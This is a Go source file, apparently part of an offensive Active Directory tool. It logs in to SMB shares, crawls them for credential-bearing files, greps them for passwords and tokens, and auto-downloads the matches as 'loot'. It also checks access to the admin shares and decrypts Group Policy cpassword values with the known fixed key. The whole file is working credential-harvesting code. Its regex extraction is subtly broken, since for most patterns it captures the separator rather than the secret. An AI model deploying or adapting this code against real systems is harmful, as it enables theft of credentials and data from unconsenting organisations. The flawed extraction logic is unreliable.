package advanced

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/hirochachacha/go-smb2"
	"github.com/thechosenone-shall-prevail/KERB-SLEUTH/pkg/util"
)

// GPPSimpleResult represents a found password in GPP
type GPPSimpleResult struct {
	User     string `json:"user"`
	Password string `json:"password"`
	Source   string `json:"source"`
}

// FileFinding represents a sensitive file found on a share
type FileFinding struct {
	Path      string    `json:"path"`
	Share     string    `json:"share"`
	Size      int64     `json:"size"`
	Modified  time.Time `json:"modified"`
	LootFound []string  `json:"loot_found,omitempty"`
}

// SMBAnalyzer handles SMB-related discovery (Shares, GPP, etc.)
type SMBAnalyzer struct {
	Target   string
	Username string
	Password string
	Domain   string
}

func NewSMBAnalyzer(target, username, password, domain string) *SMBAnalyzer {
	// Sanitize username: remove domain if it's already there (e.g. DOMAIN\user -> user)
	cleanUser := username
	if strings.Contains(username, "\\") {
		parts := strings.Split(username, "\\")
		cleanUser = parts[len(parts)-1]
	} else if strings.Contains(username, "@") {
		parts := strings.Split(username, "@")
		cleanUser = parts[0]
	}

	return &SMBAnalyzer{
		Target:   target,
		Username: cleanUser,
		Password: password,
		Domain:   domain,
	}
}

func (sa *SMBAnalyzer) createSession() (*smb2.Session, *net.Conn, error) {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:445", sa.Target), 5*time.Second)
	if err != nil {
		return nil, nil, err
	}

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     sa.Username,
			Password: sa.Password,
			Domain:   sa.Domain,
		},
	}

	session, err := d.Dial(conn)
	if err != nil {
		conn.Close()
		return nil, nil, err
	}

	return session, &conn, nil
}

// EnumerateShares lists all available shares on the target
func (sa *SMBAnalyzer) EnumerateShares() ([]string, error) {
	session, conn, err := sa.createSession()
	if err != nil {
		return nil, err
	}
	defer (*conn).Close()
	defer session.Logoff()

	shares, err := session.ListSharenames()
	if err != nil {
		return nil, err
	}

	return shares, nil
}

// DeepFileHunt recursively searches for sensitive files on a share
func (sa *SMBAnalyzer) DeepFileHunt(share string) ([]FileFinding, error) {
	session, conn, err := sa.createSession()
	if err != nil {
		return nil, err
	}
	defer (*conn).Close()
	defer session.Logoff()

	fs, err := session.Mount(share)
	if err != nil {
		return nil, err
	}
	defer fs.Umount()

	var findings []FileFinding
	err = sa.walkFiles(fs, share, "", &findings)
	return findings, err
}

func (sa *SMBAnalyzer) walkFiles(fs *smb2.Share, share, path string, findings *[]FileFinding) error {
	files, err := fs.ReadDir(path)
	if err != nil {
		return nil // Skip shares we can't read
	}

	exts := map[string]string{
		".log":    "Log",
		".txt":    "Text",
		".conf":   "Config",
		".config": "Config",
		".xml":    "XML",
		".ini":    "INI",
		".json":   "JSON",
		".bak":    "Backup",
		".sql":    "SQL",
		".ps1":    "Script",
		".bat":    "Script",
	}

	keywords := []string{"password", "pass", "creds", "secret", "key", "admin", "login", "user", "connection", "database", "db"}

	for _, file := range files {
		fullName := filepath.Join(path, file.Name())
		if file.IsDir() {
			// Limit depth to avoid infinite loops or massive shares
			if strings.Count(fullName, string(os.PathSeparator)) < 3 {
				sa.walkFiles(fs, share, fullName, findings)
			}
			continue
		}

		lowerName := strings.ToLower(file.Name())
		ext := filepath.Ext(lowerName)

		isSensitive := false

		// Check extension
		if _, ok := exts[ext]; ok {
			isSensitive = true
		}

		// Check keywords
		for _, kw := range keywords {
			if strings.Contains(lowerName, kw) {
				isSensitive = true
				break
			}
		}

		if isSensitive {
			stat, err := fs.Stat(fullName)
			if err != nil {
				continue
			}

			finding := FileFinding{
				Path:     fullName,
				Share:    share,
				Size:     file.Size(),
				Modified: stat.ModTime(),
			}

			// RAID AND DOWNLOAD
			log.Printf("    [*] Raiding %s for secrets...", fullName)
			loot := sa.RaidFileForSecrets(fs, fullName)
			if len(loot) > 0 {
				finding.LootFound = loot
			}

			// AUTO-DOWNLOAD
			localPath := filepath.Join("loot", share, fullName)
			os.MkdirAll(filepath.Dir(localPath), 0755)
			if err := sa.DownloadFile(fs, fullName, localPath); err == nil {
				log.Printf("    %s[+] Downloaded: %s → %s%s", util.Green, fullName, localPath, util.Reset)
			}

			*findings = append(*findings, finding)
		}
	}
	return nil
}

// RaidFileForSecrets reads the beginning of a file and greps for credentials
func (s *SMBAnalyzer) RaidFileForSecrets(fs *smb2.Share, path string) []string {
	f, err := fs.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()

	// Read first 16KB for deeper analysis
	buf := make([]byte, 16384)
	n, err := f.Read(buf)
	if err != nil && n == 0 {
		return nil
	}
	raw := buf[:n]

	// 1. Detect and convert UTF-16
	content := ""
	if isUTF16(raw) {
		content = decodeUTF16(raw)
	} else {
		content = string(raw)
	}

	// 2. Aggressive Regex patterns
	patterns := map[string]string{
		"Password": `(?i)(password|pass|pwd|passwd|secret)\s*(is|[:=])\s*([^\s"';]+)`,
		"Token":    `(?i)(token|key|api|cred|creds)\s*(is|[:=])\s*([^\s"';]+)`,
		"Generic":  `(?i)(login|user|admin)\s*(is|[:=])\s*([^\s"';]+)`,
		"Naked":    `(?i)(password|pwd|secret)\s*([^\s"';]{6,})`,
	}

	var loot []string
	for name, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindAllStringSubmatch(content, -1)
		for _, m := range matches {
			if len(m) > 2 {
				secret := strings.TrimSpace(m[2])
				if len(secret) > 3 && !strings.Contains(strings.ToLower(secret), "account") {
					loot = append(loot, fmt.Sprintf("%s: %s", name, secret))
				}
			} else if len(m) == 2 {
				// For "Naked" pattern
				secret := strings.TrimSpace(m[1])
				if len(secret) > 3 {
					loot = append(loot, fmt.Sprintf("%s: %s", name, secret))
				}
			}
		}
	}

	return uniqueStrings(loot)
}

func isUTF16(data []byte) bool {
	if len(data) < 2 {
		return false
	}
	// Check for BOM (Byte Order Mark)
	if (data[0] == 0xFF && data[1] == 0xFE) || (data[0] == 0xFE && data[1] == 0xFF) {
		return true
	}
	// Heuristic: check for many null bytes in a small sample (typical for UTF-16 ASCII)
	nulls := 0
	limit := len(data)
	if limit > 100 {
		limit = 100
	}
	for i := 0; i < limit; i++ {
		if data[i] == 0 {
			nulls++
		}
	}
	return nulls > (limit / 4)
}

func decodeUTF16(data []byte) string {
	if len(data) < 2 {
		return string(data)
	}

	var u16 []uint16
	// Detect endianness and remove BOM
	isBigEndian := false
	start := 0
	if data[0] == 0xFE && data[1] == 0xFF {
		isBigEndian = true
		start = 2
	} else if data[0] == 0xFF && data[1] == 0xFE {
		isBigEndian = false
		start = 2
	}

	for i := start; i+1 < len(data); i += 2 {
		var val uint16
		if isBigEndian {
			val = binary.BigEndian.Uint16(data[i : i+2])
		} else {
			val = binary.LittleEndian.Uint16(data[i : i+2])
		}
		u16 = append(u16, val)
	}
	return string(utf16.Decode(u16))
}

func uniqueStrings(input []string) []string {
	u := make([]string, 0, len(input))
	m := make(map[string]bool)
	for _, val := range input {
		if _, ok := m[val]; !ok {
			m[val] = true
			u = append(u, val)
		}
	}
	return u
}

// DownloadFile downloads a file from an SMB share to a local path
func (s *SMBAnalyzer) DownloadFile(fs *smb2.Share, remotePath, localPath string) error {
	f, err := fs.Open(remotePath)
	if err != nil {
		return err
	}
	defer f.Close()

	local, err := os.Create(localPath)
	if err != nil {
		return err
	}
	defer local.Close()

	_, err = io.Copy(local, f)
	return err
}

// CheckAdminAccess checks if the user has administrative access (can access ADMIN$ or C$)
func (sa *SMBAnalyzer) CheckAdminAccess() (bool, error) {
	session, conn, err := sa.createSession()
	if err != nil {
		return false, err
	}
	defer (*conn).Close()
	defer session.Logoff()

	adminShares := []string{"ADMIN$", "C$"}
	for _, share := range adminShares {
		fs, err := session.Mount(share)
		if err == nil {
			fs.Umount()
			return true, nil
		}
	}

	return false, nil
}

// ScanGPP scans for GPP passwords in SYSVOL
func (sa *SMBAnalyzer) ScanGPP() ([]GPPSimpleResult, error) {
	session, conn, err := sa.createSession()
	if err != nil {
		return nil, err
	}
	defer (*conn).Close()
	defer session.Logoff()

	fs, err := session.Mount("SYSVOL")
	if err != nil {
		return nil, err
	}
	defer fs.Umount()

	var results []GPPSimpleResult
	// Recursively walk SYSVOL searching for GPP XMLs
	err = sa.walkGPP(fs, ".", &results)
	return results, err
}

func (sa *SMBAnalyzer) walkGPP(fs *smb2.Share, path string, results *[]GPPSimpleResult) error {
	files, err := fs.ReadDir(path)
	if err != nil {
		return nil
	}

	gppFiles := []string{
		"Groups.xml",
		"Services.xml",
		"Scheduledtasks.xml",
		"Datasources.xml",
		"Printers.xml",
		"Drives.xml",
	}

	for _, file := range files {
		fullName := filepath.Join(path, file.Name())
		if file.IsDir() {
			sa.walkGPP(fs, fullName, results)
			continue
		}

		for _, gppFile := range gppFiles {
			if strings.EqualFold(file.Name(), gppFile) {
				found, err := sa.parseGPPXML(fs, fullName)
				if err == nil && len(found) > 0 {
					*results = append(*results, found...)
				}
			}
		}
	}
	return nil
}

func (sa *SMBAnalyzer) parseGPPXML(fs *smb2.Share, path string) ([]GPPSimpleResult, error) {
	f, err := fs.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	content, err := io.ReadAll(f)
	if err != nil {
		return nil, err
	}

	// Simple regex parsing for cpassword
	userRegex := regexp.MustCompile(`(?i)userName="([^"]+)"`)
	passRegex := regexp.MustCompile(`(?i)cpassword="([^"]+)"`)

	users := userRegex.FindAllSubmatch(content, -1)
	passes := passRegex.FindAllSubmatch(content, -1)

	var results []GPPSimpleResult
	for i := 0; i < len(users) && i < len(passes); i++ {
		username := string(users[i][1])
		cpass := string(passes[i][1])

		password, err := decryptGPP(cpass)
		if err == nil {
			results = append(results, GPPSimpleResult{
				User:     username,
				Password: password,
				Source:   path,
			})
		}
	}

	return results, nil
}

func decryptGPP(cpassword string) (string, error) {
	// GPP fixed key
	key := []byte{
		0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
		0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
		0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
		0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
	}

	// Add padding if needed
	for len(cpassword)%4 != 0 {
		cpassword += "="
	}

	data, err := base64.StdEncoding.DecodeString(cpassword)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	iv := make([]byte, 16) // Zero IV for GPP
	mode := cipher.NewCBCDecrypter(block, iv)

	decrypted := make([]byte, len(data))
	mode.CryptBlocks(decrypted, data)

	// PKCS7 Unpadding
	paddingLen := int(decrypted[len(decrypted)-1])
	if paddingLen > 0 && paddingLen <= 16 {
		decrypted = decrypted[:len(decrypted)-paddingLen]
	}

	return string(decrypted), nil
}
